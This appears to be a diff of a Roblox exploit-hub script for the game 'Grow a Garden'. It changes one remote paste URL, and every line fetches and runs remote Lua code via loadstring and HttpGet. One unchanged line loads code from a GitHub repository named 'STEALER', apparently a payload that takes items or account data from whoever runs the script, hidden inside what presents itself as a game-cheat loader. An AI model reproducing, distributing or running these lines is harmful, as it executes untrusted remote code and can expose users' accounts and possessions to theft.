@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
 -- For Mobile Copy:
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/5ST1EzECG9cXo4WS/raw", true))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/IGYxOfv8Blt31YgR/raw", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/STEALER/refs/heads/main/OWNNN1"))()
